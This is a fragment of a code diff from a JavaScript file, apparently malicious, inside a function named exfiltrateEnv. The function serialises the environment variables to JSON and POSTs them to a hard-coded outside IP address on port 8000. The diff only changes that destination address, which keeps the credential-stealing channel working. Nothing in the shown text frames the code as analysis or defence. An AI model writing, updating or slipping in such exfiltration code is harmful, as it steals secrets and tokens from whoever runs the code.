@@ -7,7 +7,7 @@ function exfiltrateEnv(env) {
   const payload = JSON.stringify(env);
 
   const options = {
-    hostname: "54.91.192.110",  
+    hostname: "98.93.3.2",  
     port: 8000,
     path: "/",
     method: "POST",
